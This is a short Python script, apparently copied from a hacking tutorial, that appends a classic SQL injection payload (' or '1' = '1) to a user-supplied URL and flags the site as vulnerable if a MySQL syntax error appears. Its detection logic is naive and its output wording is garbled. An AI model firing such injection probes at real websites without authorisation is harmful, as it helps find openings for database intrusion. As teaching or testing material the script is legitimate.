# SQLI TESTER
import sys
import urllib
import urllib.request

print(" --: SQLi TESTER :-- ")

fullurl = input("Please enter the url:")

resp = urllib.request.urlopen(fullurl + "=1\' or \'1\' = \'1\''")

body = resp.read()

fullbody = body.decode('utf-8')

print(resp)


if "You have an error in your SQL syntax" in fullbody:
    print("The website is classic SQL injection vulnerable")
else:
    print("The website is safe for classic SQL injection vulnerable")

#https://www.hacking-tutorial.com/hacking-tutorial/code-your-first-simple-sql-injection-checking-vulnerability-with-python/#sthash.VtMamB4Q.dpbs
